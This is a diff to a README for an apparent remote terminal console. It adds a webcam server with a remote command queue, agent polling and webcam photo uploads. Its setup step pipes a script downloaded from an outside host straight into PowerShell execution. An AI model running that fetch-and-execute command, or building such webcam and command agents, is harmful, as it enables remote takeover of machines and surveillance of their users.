@@ -35,16 +35,30 @@ A high-performance remote terminal and hardware inspection console connecting ph
 
 ---
 
+6. **`webcam-server.js`**
+   - Express & Multer powered Live Webcam & Command Queue server.
+   - Real-time Server-Sent Events (SSE) updates on `/api/events`.
+   - Remote command queue dispatch on `/api/command` & agent polling on `/api/poll`.
+   - Multipart webcam photo upload handler on `/api/upload-webcam` (persists to `public/uploads/`).
+
+---
+
 ## 🚀 How to Run Locally
 
-### 1. Starting the Server:
+### 1. Starting the Terminal Server:
 ```bash
 npm install
 node server.js
 ```
-The server runs on port `3880`.
+The terminal server runs on port `3880`.
 
-### 2. Connecting a Windows Machine:
+### 2. Starting the Webcam Server:
+```bash
+npm run webcam
+# or: PORT=3881 node webcam-server.js
+```
+
+### 3. Connecting a Windows Machine:
 Open PowerShell on the Windows machine and run:
 ```powershell
 irm https://kotukole.com/lap/agent.ps1 | iex
